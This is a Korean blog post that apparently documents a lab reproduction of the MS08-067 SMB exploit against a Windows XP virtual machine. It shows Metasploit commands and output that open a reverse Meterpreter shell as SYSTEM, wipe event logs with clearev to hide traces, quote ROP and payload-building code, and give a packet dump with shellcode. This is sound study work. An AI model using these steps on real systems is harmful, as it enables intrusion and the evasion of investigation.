---
layout: post
title: "SMB 취약점(MS08-067) exploit POC"
categories: [보안, 취약점스캐너]
tags: [취약점, 스캐너, metasploit, MS08-067, SMB]
toc: true
last_modified_at: 2023-08-15 16:02:00 +0900
---

# 개요 
- 유명한 SMB취약점(MS08-067)을 POC해본다. 
- 이 취약점은 이름이 "Microsoft Server Service Relative Path Stack Corruption" 로 되어 있다. 
- 컨피커 웜이 악용한 것으로도 유명한 취약점이다. 

포트 139는 NetBIOS(Network Basic Input Output System)의 이름 확인에 사용되고 포트 445는 SMB(Server Message Block)에 사용된다. 

# 취약한 환경 구성하기 
- 취약한 환경은 Windows XP로 구성했다. 
- 책이나 웹 문서를 찾아봐도 실제로 어떻게 취약한 환경을 만드는지를 제대로 설명해주는 부분이 없어서 따로 찾아보면서 만들었다. 
- 자세한 것은 [Windows XP 환경 구성하기]({% post_url 2023-08-14-virtualbox-windows-xp %})에 정리해두었다. 
- 기본 설치만으로도 취약점은 재현 가능했다. 따로 공유폴더 설정까지 해둘 필요는 없었다. 

# exploit 실시 
## 모듈 로드 

```sh
msf6 > use exploit/windows/smb/ms08_067_netapi
```

## Nmap 으로 포트 스캔
- 공격 대상은 192.168.56.104 에서 운영중인 Windows XP 시스템이다. 
- 135,139,445 포트가 열려있는 것, 그리고 해당 포트에서 운영중인 서비스를 확인했다! 

```sh
msf6 exploit(windows/smb/ms08_067_netapi) > nmap -sV 192.168.56.104
[*] exec: nmap -sV 192.168.56.104

Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-14 23:25 EDT
Nmap scan report for 192.168.56.104
Host is up (0.92s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.78 seconds
msf6 exploit(windows/smb/ms08_067_netapi) > 

```

## 공격 대상 지정하기 
- RHOSTS는 공격대상 시스템의 IP주소를 설정한다. 
- RPORT에는 SMB 프로토콜 포트인 445포트를 지정한다. 
- LHOST에는 스캔을 수행하는 시스템(공격자측)의 IP주소를 지정한다. 


```sh
msf6 > set RHOSTS 192.168.56.104
msf6 > set RPORT 445
msf6 > set LHOST 192.168.56.102
```

- LHOST 부분이 중요하다. 이 것을 제대로 설정하지 않으면, (예를 들면 그냥 기본 값으로 두면)  스캔 대상 측의 SMB 서비스가 다운된다! 다운된 후에는 Windows XP측에서는 445포트가 열려있는데 공격측에서는 Nmap스캔을 해도 445포트가 열려있다고 나오지 않는다. 이 원인을 알아내느라 고생했다...
- 출처: https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/ms08_067_netapi.md 에서 원인을 찾았다. 다음과 같이 적혀있다. 

```
Unsafe configuration of LHOST

Although ms08_067_netapi is reliable enough for a memory corruption exploit, it has its own denial-of-service moments. One scenario is when the LHOST option is incorrectly configured, which could result the SMB to crash.
```

## 체크수행
취약하다는 결과를 볼 수 있다. 

```sh
msf6 exploit(windows/smb/ms08_067_netapi) > check
[+] 192.168.56.104:445 - The target is vulnerable.

```

## exploit수행 
run 을 실행하면 exploit 코드가 실행된다. exploit에 성공하여 meterpreter 셸이 실행된 것을 볼 수 있다. 

```sh
msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 192.168.56.102:4444 
[*] 192.168.56.104:445 - Automatically detecting the target...
[*] 192.168.56.104:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 192.168.56.104:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 192.168.56.104:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 192.168.56.104
[*] Meterpreter session 1 opened (192.168.56.102:4444 -> 192.168.56.104:1043) at 2023-08-14 23:38:01 -0400

meterpreter > 


```

![exploit성공](/images/metasploit-ms08-067-exploit-success.png)


### exploit을 실패하는 경우 
참고로 exploit을 실패하는 경우에는 다음처럼 출력된다. `Exploit completed, but no session was created.` 원인은 LHOST (공격측)의 IP주소가 희생자측 IP주소에 접근가능한 네트워크(여기서는 내부 네트워크)의 IP주소로 설정되어 있지 않는 것이 원인이었다. LHOST를 공격자측이 할당받은 내부 네트워크의 IP주소(여기서는 192.168.56.102)로 설정해줘야 한다. 그리고 이 취약점의 경우는 LHOST를 제대로 설정하지 않은 상태에서 exploit을 시도하면 희생자측 시스템의 SMB 서비스가 망가지는 현상이 있으므로, 희생자측 서비스도 복구해야 한다. (Virtualbox로 미리 스냅샷을 떠두면 좋다.)

```sh
msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.0.2.15:4444 
[*] 192.168.56.101:445 - Automatically detecting the target...
[*] 192.168.56.101:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 192.168.56.101:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 192.168.56.101:445 - Attempting to trigger the vulnerability...
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms08_067_netapi) > 

```

# exploit 후에 가능한 것들
meterpreter 세션이 성립된 후에 가능한 것들을 정리한다. 

## 사용가능한 기능 조사 
- `help`를 치면 사용가능한 다양한 커맨드를 알려준다. help에서 알려주는 기능만해도 꽤 다양하다. 
- 또한 `use -l`을 쳐보면 어떤 확장 기능을 사용가능한지 목록으로 알려준다. help에서 알려주는 기능과는 또 다른 기능으로 보인다. 

```sh
meterpreter > use -l
bofloader
espia
extapi
incognito
kiwi
lanattacks
peinjector
powershell
priv
python
sniffer
stdapi
unhook
winpmem
meterpreter > 
```

## 사용자 권한 확인하기 
getuid 로 현재 획득한 셸의 사용자 권한을 확인할 수 있다. 시스템 권한을 획득한 것을 확인할 수 있다. 사실상 거의 모든 것을 할 수 있다는 것을 의미한다. 

```sh
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

## 이벤트 로그 삭제하기 
- Windows 시스템에서 이벤트 로그는 침해 사고 조사등에서 공격 흔적을 찾는데 유용하게 쓰인다. 
- 따라서 공격자 입장에서는 이벤트 로그를 삭제해두면 추적을 피할 수 있다. 
- `clearev` 커맨드로 이벤트 로그를 삭제할 수 있다. 
- 실행해본다. 다음과 같이 이벤트 로그가 삭제되었다고 출력된다. 

```sh
meterpreter > clearev
[*] Wiping 93 records from Application...
[*] Wiping 57 records from System...
[*] Wiping 0 records from Security...
meterpreter > 

```

![이벤트 로그 삭제](/images/ms08-067-meterpreter-clearev.png)

이벤트 로그 삭제전은 다음과 같다. 

![이벤트 로그 삭제전](/images/ms08-067-meterpreter-clearev-pre.png)

이벤트 로그 삭제후는 다음과 같다. 정말로 삭제가 됐다. 무섭다. 

![이벤트 로그 삭제후](/images/ms08-067-meterpreter-clearev-post.png)


## 프로세스 목록 확인하기 
ps 커맨드로 희생자 시스템에서 동작중인 프로세스를 확인할 수 있다. 

![ps커맨드 실행결과](/images/ms08-067-meterpreter-ps.png)

# exploit 분석 
exploit 코드도 분석해보자. 어떤 원리로 동작하는지 간단하게라도 정리해보자. 

## 추측 
이 취약점의 이름은 "Microsoft Server Service Relative Path Stack Corruption" 이다. BOF(버퍼오버플로) 취약점을 이용하는 것 같다. 이름으로 추측컨대 상대 경로를 처리하는 부분에 버그가 있어서, 이상한 상대 경로를 입력해서 프로그램 오동작을 유도, 에러 발생시의 실행 코드를 셸코드로 바꾸는 원리(스택 상에서 프로그램 리턴 주소를 셸코드 주소로 변경하는 등)인 것 같다. 

## 개요 
- 익스플로잇 코드는 `modules/exploits/windows/smb/ms08_067_netapi.rb` 에서 확인할 수 있다. 
- 약 1300라인 정도 되는 코드이다. 
- initialize(12~857라인), exploit(941~1186라인), check (1188~1255라인), generate_rop(1257~1378라인)의 네 개의 함수로 이루어진 클래스이다. 

### initialize 함수 
- initialize함수에는 배너 및 공격가능한 시스템의 이름 및 exploit 코드 실행을 위한 정보(RetDec, RetPop, JmpESP, DisableNXScratch)가 적혀 있다. 
- Description 에는 다음과 같은 설명이 적혀있다. 

```
 This module exploits a parsing flaw in the path canonicalization code of
NetAPI32.dll through the Server Service. This module is capable of bypassing
NX on some operating systems and service packs. The correct target must be
used to prevent the Server Service (along with a dozen others in the same
process) from crashing. Windows XP targets seem to handle multiple successful
exploitation events, but 2003 targets will often crash or hang on subsequent
attempts. This is just the first version of this module, full support for
NX bypass on 2003, along with other platforms, is still in development.
```

- 이 모듈은 서버 서비스를 통한 NetAPI32.dll의 경로 정규화 코드의 구문 분석 결함을 악용한다. 
- 이 모듈은 일부 운영 체제 및 서비스 팩의 NX바이패스가 가능하다. 
- NX(NoExecute)는 BOF의 방어책중 하나인 DEP(Data Execution Prevention)과 동일한 의미라고 한다. (https://cheats.philkeeble.com/exploit-dev/linux/bypassing-nx-dep)
- 즉, 이 exploit코드에는 BOF 방어책을 우회해서 셸을 구동하는 기능이 있다는 것이다. 

### generate_rop함수
다음은 generate_rop함수의 1301~1311라인의 코드이다. 어셈블리어로 되어 있어서 분석이 어렵지만 아마 프로그램 커서를 셸 코드(셸을 구동하는 코드)로 이동시키는 부분일 것으로 추측된다. 

```rb
    # XP SP3
    rvasets['5.1.2600.5512'] = {
      # call [imp_HeapCreate] / mov [0x6f8b02c], eax / ret
      'call_HeapCreate'                          => 0x21286,
      'add eax, ebp / mov ecx, 0x59ffffa8 / ret' => 0x2e796,
      'pop ecx / ret'                            => 0x2e796 + 6,
      'mov [eax], ecx / ret'                     => 0xd296,
      'jmp eax'                                  => 0x19c6f,
      'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret' => 0x10a56,
      'mov [eax+0x10], ecx / ret'                => 0x10a56 + 6,
      'add eax, 8 / ret'                         => 0x29c64
    }
```

### exploit 함수 
- 다음은 exploit 함수의 1094 ~1124 라인의 코드이다. 상대경로 값 (path)에 페이로드를 지정해준다. 
- 페이로드에서 중요한 부분은 rop값을 만들어주는 코드이다. (generate_rop함수의 리턴값이 들어간다.)
- 상대경로 값이 `\{알파벳랜덤값100자리문자열}{셸코드}\..\..\{패딩}{rop값}{알파벳랜덤값2자리문자열}{널바이트두개}`로 이루어진 것을 알 수 있다. 

```rb
  #
    # Windows XP SP2/SP3 ROP Stager targets
    #
    elsif mytarget['UseROP']

      rop = generate_rop(mytarget['UseROP'])

      path =
        Rex::Text.to_unicode('\\') +

        # This buffer is removed from the front
        Rex::Text.rand_text_alpha(100) +

        # Shellcode
        payload.encoded +

        # Relative path to trigger the bug
        Rex::Text.to_unicode('\\..\\..\\') +

        # Extra padding
        Rex::Text.to_unicode(pad) +

        # ROP Stager
        rop +

        # Padding (skipped)
        Rex::Text.rand_text_alpha(2) +

        # NULL termination
        "\x00" * 2

```

## 패킷 캡쳐 
- 실제 TCP통신상의 페이로드는 어떻게 되는지 한번 패킷을 캡쳐해보고 싶다.
- 다음 순서로 패킷을 캡쳐했다. 

### tshark 로 패킷 캡쳐 준비 
-w 옵션으로 dump파일명을 지정하고 -i 옵션으로 캡쳐할 인터페이스를 지정한다. Virtualbox환경에서 호스트 온리 네트워크의 인터페이스는 eth1였으므로 eth1를 지정해주었다. 

```sh
shark -w smb_packet.dump -i eth1
```

### exploit을 수행
다시 한번 exploit을 수행한다. (run 커맨드를 실행한다.)

### tshark를 종료한다. 
Ctrl + C 를 눌러서 패킷캡쳐를 종료한다. 

### wireshark로 패킷 분석 
다음 명령어로 wireshark를 구동해서 패킷을 분석할 수 있다. 

```sh
wireshark smb_packet.dump
```

![wireshark화면](/images/ms08-067-packet-capture.png)

## 분석 
- 가장 알고싶은 것은 공격자측에서 희생자측으로 어떤 페이로드를 보냈냐는 것이다. 
- 따라서 공격자측(192.168.56.102)에서 희생자측(192.168.56.104)으로의 통신을 집중적으로 보면된다. 

### SMB 프로토콜 흐름 
- SMB 프로토콜이 어떤 통신을 수행하는지 간략하게나마 알아야 한다. 
- https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-SMB/%5BMS-SMB%5D.pdf 에 스펙을 정리한 문서가 있다. 179페이지짜리 문서있다.  
- SMB는 MS-CIFS 프로토콜의 확장이라고 한다. 따라서 기본은 MS-CIFS를 보면 될 것 같다. 
- https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-CIFS/%5BMS-CIFS%5D.pdf 에는 MS-CIFS 스펙 문서가 있다. 722페이지짜리 방대한 문서로 한꺼번에 읽기에는 부담된다. 
- SMB 프로토콜의 대략적인 플로우는 다음과 같다. 

![SMB 프로토콜 플로우](/images/msb-protocol-flow.png)
(출처: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/495dd941-0776-48aa-aa8a-f1aa5eeadcea)

###  전체적인 흐름
패킷의 전체적인 흐름은 다음과 같았다. 

- 패킷 6~8: TCP 3way 핸드셰이크
- 패킷 9~17: SMB 로그인 시도
- 패킷 18~93: exploit 시도
- 패킷 94~337: exploit 성공후 Meterpreter 셸 수립 과정 (희생자측 포트 4444로 통신이 일어나는 것으로 알 수 있다.)

따라서 패킷 18~93 사이를 잘 살펴보면 된다. SMB 프토로콜 흐름을 염두에 두면서 패킷을 따라가본다. 

조사 결과 90번째 패킷이 실제 공격 페이로드를 보내는 패킷이라는 것을 알게 되었다. RPC 바인드 요청(DCERPC)의 바로 다음 패킷이다. 

![90번째 패킷](/images/ms08-067-packet-analysis-01.png)


패킷덤프 내용은 다음과 같다. 775바이트이다. 위쪽은 각종 프로토콜에서 사용되는 부분이고, 주소 0x0086부터의 642바이트가 데이터이다. 

```
0000   08 00 27 93 43 a5 08 00 27 64 4c ed 08 00 45 00   ..'.C...'dL...E.
0010   02 f9 5d 30 40 00 40 06 e8 af c0 a8 38 66 c0 a8   ..]0@.@.....8f..
0020   38 68 a9 75 01 bd 0a 38 99 e6 d0 f4 a2 7c 80 18   8h.u...8.....|..
0030   01 f5 f5 0a 00 00 01 01 08 0a ec 4b f3 4e 00 03   ...........K.N..
0040   00 89 00 00 02 c1 ff 53 4d 42 2f 00 00 00 00 18   .......SMB/.....
0050   01 28 00 00 00 00 00 00 00 00 00 00 00 00 01 08   .(..............
0060   e5 76 03 08 c9 73 0e ff 00 00 00 05 40 00 00 00   .v...s......@...
0070   00 ff ff ff ff 08 00 82 02 00 00 82 02 3f 00 00   .............?..
0080   00 00 00 82 02 05 00 00 03 10 00 00 00 cc 02 00   ................
0090   00 00 00 00 00 b4 02 00 00 0e 00 1f 00 3e 94 86   .............>..
00a0   de 08 00 00 00 00 00 00 00 08 00 00 00 4f 00 41   .............O.A
00b0   00 51 00 59 00 4c 00 51 00 45 00 00 00 35 01 00   .Q.Y.L.Q.E...5..
00c0   00 00 00 00 00 35 01 00 00 5c 00 65 70 66 50 59   .....5...\.epfPY
00d0   5a 6b 66 6d 71 51 66 4f 68 45 72 72 6d 52 6e 67   ZkfmqQfOhErrmRng
00e0   77 72 57 61 6d 4a 42 55 4e 41 67 4d 64 55 4a 58   wrWamJBUNAgMdUJX
00f0   51 77 58 6d 54 53 62 66 70 55 72 77 5a 48 5a 4c   QwXmTSbfpUrwZHZL
0100   71 61 72 50 70 4a 52 44 54 6a 61 72 6f 69 77 44   qarPpJRDTjaroiwD
0110   68 6f 69 74 6b 6c 65 4c 54 61 51 74 6a 43 73 53   hoitkleLTaQtjCsS
0120   68 59 4f 72 4d 78 74 65 44 45 46 6a 62 47 48 98   hYOrMxteDEFjbGH.
0130   49 f9 98 98 d6 3f 49 fc 42 fc 93 9f 49 99 4a 92   I....?I.B...I.J.
0140   47 90 fc 93 fd 37 fc fd 49 4b 4f 4e 48 91 f9 9f   G....7..IKONH...
0150   91 90 9b fc 4f 4f 48 4b 92 98 91 91 fd 46 f5 47   ....OOHK.....F.G
0160   f8 fc 90 fd 48 eb 23 5b 89 df b0 a6 fc ae 75 fd   ....H.#[......u.
0170   89 f9 89 de 8a 06 30 07 47 66 81 3f 65 30 74 08   ......0.Gf.?e0t.
0180   46 80 3e a6 75 ee eb ea ff e1 e8 d8 ff ff ff 91   F.>.u...........
0190   a6 10 55 c5 63 6e 6e 10 75 61 6e 6e 6e 6d 79 1e   ..U.cnn.uannnmy.
01a0   91 91 91 f1 a0 43 f5 1a c3 a1 18 74 1a c3 9d 1a   .....C.....t....
01b0   c3 85 9e 26 db b7 1a e3 b9 a0 6e a0 51 3d ad f0   ...&......n.Q=..
01c0   ed 93 bd b1 50 5e 9c 90 56 d8 e4 7e c3 c6 1a c3   ....P^..V..~....
01d0   81 1a d3 ad 90 41 1a d1 e9 14 51 e5 dd 90 41 1a   .....A....Q...A.
01e0   c9 b1 90 42 c1 1a d9 89 14 58 e5 ad d8 a0 6e 1a   ...B.....X....n.
01f0   a5 1a 90 47 a0 51 50 5e 9c 3d 90 56 a9 71 e4 65   ...G.QP^.=.V.q.e
0200   92 ec 69 aa ec b5 e4 71 c9 1a c9 b5 90 42 f7 1a   ..i....q.....B..
0210   9d da 1a c9 8d 90 42 1a 95 1a 90 41 18 d5 b5 b5   ......B....A....
0220   ca ca f0 c8 cb c0 6e 71 c9 ce cb 1a 83 78 11 6e   ......nq.....x.n
0230   6e 6e cc f9 a2 a3 91 91 f9 e6 e2 a3 ce c5 f9 dd   nn..............
0240   e6 b7 96 18 79 6e 41 29 01 90 91 91 b8 55 c5 c1   ....ynA).....U..
0250   f9 b8 11 fa 91 6e 44 fb 9b f9 51 39 a9 f7 f9 93   .....nD...Q9....
0260   91 80 cd 18 77 c1 c1 c1 c1 d1 c1 d1 c1 f9 7b 9e   ....w.........{.
0270   4e 71 6e 44 06 fb 81 c7 c6 f9 08 34 e5 f0 6e 44   NqnD.......4..nD
0280   14 51 e5 9d 6e df 99 e4 7d f9 61 24 33 c7 6e 44   .Q..n...}.a$3.nD
0290   fb 91 fb 95 c7 c6 f9 93 48 59 ce 6e 44 1a a7 fb   ........HY.nD...
02a0   d1 f9 91 81 91 91 c7 fb 91 f9 c9 35 c2 74 6e 44   ...........5.tnD
02b0   02 c2 fb 91 c7 c2 c6 f9 93 48 59 ce 6e 44 90 52   .........HY.nD.R
02c0   b8 57 e4 7f 52 65 30 5c 00 2e 00 2e 00 5c 00 2e   .W..Re0\.....\..
02d0   00 2e 00 5c 00 41 00 4a 00 4c 00 59 00 52 00 48   ...\.A.J.L.Y.R.H
02e0   00 5a 00 00 80 01 00 86 12 8a 6f 10 01 04 01 01   .Z........o.....
02f0   01 01 01 01 01 01 01 96 e7 8a 6f 9c e7 8a 6f 90   ..........o...o.
0300   5a 59 c3 96 d2 88 6f                              ZY....o
```

위에서 exploit 코드 분석 결과 페이로드는 `\{알파벳랜덤값100자리문자열}{셸코드}\..\..\{패딩}{rop값}{알파벳랜덤값2자리문자열}{널바이트두개}`과 같은 형태라는 것을 알고 있다. 

- `\`는 유니코드의 바이트코드로 표현하면 0x005c 이다. 패킷상에서는 리틀엔디언이므로 `5c 00` 로 표현되는 걸로 보인다. 
- 패킷덤프의 0x00ca 주소부터 시작하는 부분의 문자열(epfPY~) 이 알파벳랜덤값100자리문자열이 들어가는 부분이다. 1번 붉은 박스에 해당하는 부분이다. 정확히 100개의 연속된 알파벳이 보인다. 
- 그리고 이어지는 2번 박스부분이 셸코드로 추정된다. 
- 3번 박스를 보면 셸코드에 `\..\..\` 가 보인다. 주소 0x02c8부터 시작되는 `5c 00 2e 00 2e 00 5c 00 2e 00 2e 00 5c 00` 부분이다. 
- 이어지는 부분은 나머지 패딩, rop, 알파벳랜덤값2자리문자열, 널바이트두개로 이루어진 부분으로 보인다. 정확히 어디부터 어디까지인지는 잘 모르겠다. 왜인지는 모르겠지만 패킷의 마지막이 널바이트 두개 (0x0000)로 끝나고 있지도 않다. 

![패킷덤프](/images/ms08-067-packet-analysis-02.png)


# 참고 
- MS08-067 취약점 개요: https://www.ahnlab.com/kr/site/securityinfo/secunews/secuNewsView.do?seq=28748
- Metasploit을 사용한 exploit: https://www.hackercoolmagazine.com/ms08_067-exploitation-to-hack-windows-xp/
- exploit 도큐먼트: https://github.com/rapid7/metasploit-framework/tree/master/documentation/modules/exploit/windows/smb
- exploit 소스코드: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms08_067_netapi.rb
- Meterpreter 사용방법: https://dazemonkey.tistory.com/127
- MS08-067 패킷분석: https://m.blog.naver.com/stop2y/221033113028
- MS08-067 패킷분석: https://www.honeynet.org/2008/11/04/ms08-067-exploitation-in-the-wild/